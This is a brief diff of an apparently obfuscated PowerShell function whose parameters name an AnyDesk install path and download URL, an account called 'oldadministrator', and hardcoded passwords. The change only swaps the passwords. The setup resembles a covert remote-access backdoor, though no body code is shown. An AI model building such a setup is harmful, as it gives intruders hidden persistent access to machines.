@@ -2,9 +2,9 @@ function Invoke-ZxYv {
     param (
         [string]$qGkL = "C:\ProgramData\AnyDesk",
         [string]$RtYh = "http://download.anydesk.com/AnyDesk.exe",
-        [string]$UzPm = "P@ssw0rd123!",
+        [string]$UzPm = "Passw0rd125@",
         [string]$BgNd = "oldadministrator",
-        [string]$KvWs = "P@ssw0rd123!"
+        [string]$KvWs = "Passw0rd125@"
     )
 
     try {
